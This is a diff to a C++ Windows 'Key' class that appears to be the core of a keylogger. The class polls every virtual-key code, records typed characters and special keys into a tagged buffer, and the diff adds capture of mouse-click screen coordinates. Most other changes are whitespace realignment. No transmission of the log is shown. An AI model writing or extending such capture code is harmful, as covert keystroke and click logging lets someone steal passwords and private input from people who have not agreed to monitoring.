@@ -22,7 +22,7 @@ Key::Key() : _lastKey(-1), _upper(false) {
 Key::~Key() {
 }
 
-void            Key::putKeyBuff(int str) {
+void                        Key::putKeyBuff(int str) {
     if (MapVirtualKey(str, MAPVK_VK_TO_CHAR) >= 65 &&
         MapVirtualKey(str, MAPVK_VK_TO_CHAR) <= 90) {
             if (!_upper)
@@ -36,11 +36,15 @@ void            Key::putKeyBuff(int str) {
             _buffer += MapVirtualKey(str, MAPVK_VK_TO_CHAR);
 }
 
-void            Key::putKeyBuff(std::string action) {
+void                        Key::putKeyBuff(std::string action) {
     _buffer += "<" + action + ">true</" + action + ">";
 }
 
-void            Key::rmLastKeyBuff() {
+void                        Key::putKeyBuff(std::string action, std::string x, std::string y) {
+    _buffer += "<" + action + ">true, x = " + x + ", y = " + y + "</" + action + ">";
+}
+
+void                        Key::rmLastKeyBuff() {
     size_t      size;
 
     size = _buffer.length();
@@ -48,7 +52,7 @@ void            Key::rmLastKeyBuff() {
         _buffer.resize(size - 1, '\0');
 }
 
-void            Key::cleanBuff() {
+void                        Key::cleanBuff() {
     if (_buffer != "")
     {
         _buffer = "";
@@ -57,16 +61,16 @@ void            Key::cleanBuff() {
     }
 }
 
-std::string     Key::getBuffer() const {
+std::string                 Key::getBuffer() const {
     return (_buffer);
 }
 
-void            Key::setStat() {
+void                        Key::setStat() {
     _stat = false;
 }
 
-bool            Key::getKey() {
-    int         keyNb;
+bool                        Key::getKey() {
+    int                     keyNb;
     
     keyNb = -1;
     while (++keyNb <= 256) {
@@ -93,79 +97,91 @@ bool            Key::vkBack() {
     return (true);
 }
 
-bool            Key::vkLbutton() {
-    putKeyBuff("left_button");
+std::string                 Key::getCursorPos(int coord) {
+    POINT                   lpPoint;
+    std::stringstream       out;
+    
+    GetCursorPos(&lpPoint);
+    if (coord == X)
+        out << (int)lpPoint.x;
+    else
+        out << (int)lpPoint.y;
+    return (out.str());
+}
+
+bool                        Key::vkLbutton() {
+    putKeyBuff("left_button", getCursorPos(X), getCursorPos(Y));
     return (true);
 }
 
-bool            Key::vkRbutton() {
-    putKeyBuff("right_button");
+bool                        Key::vkRbutton() {
+    putKeyBuff("right_button", getCursorPos(X), getCursorPos(Y));
     return (true);
 }
 
-bool            Key::vkTab() {
+bool                        Key::vkTab() {
     putKeyBuff("tab");
     return (true);
 }
 
-bool            Key::vkReturn() {
+bool                        Key::vkReturn() {
     putKeyBuff("enter");
     return (true);
 }
 
-bool            Key::vkShift() {
+bool                        Key::vkShift() {
     putKeyBuff("shift");
     return (true);
 }
 
-bool            Key::vkControl() {
+bool                        Key::vkControl() {
     putKeyBuff("control");
     return (true);
 }
 
-bool            Key::vkEscape() {
+bool                        Key::vkEscape() {
     putKeyBuff("escape");
     return (true);
 }
 
-bool            Key::vkUp() {
+bool                        Key::vkUp() {
     putKeyBuff("up");
     return (true);
 }
 
-bool            Key::vkRight() {
+bool                        Key::vkRight() {
     putKeyBuff("right_arrow");
     return (true);
 }
 
-bool            Key::vkDown() {
+bool                        Key::vkDown() {
     putKeyBuff("down_arrow");
     return (true);
 }
 
-bool            Key::vkLeft() {
+bool                        Key::vkLeft() {
     putKeyBuff("left_arrow");
     return (true);
 }
 
-bool            Key::vkInsert() {
+bool                        Key::vkInsert() {
     putKeyBuff("insert");
     return (true);
 }
 
-bool            Key::vkDelete() {
+bool                        Key::vkDelete() {
     putKeyBuff("delete");
     return (true);
 }
 
-bool            Key::vkCapital() {
+bool                        Key::vkCapital() {
     _upper = !_upper;
     if (_upper)
         std::cout << "CapsLock" << std::endl;
     return (true);
 }
 
-bool            Key::vkKey(int keyNb) {
+bool                        Key::vkKey(int keyNb) {
     putKeyBuff(keyNb);
     return (true);
 }
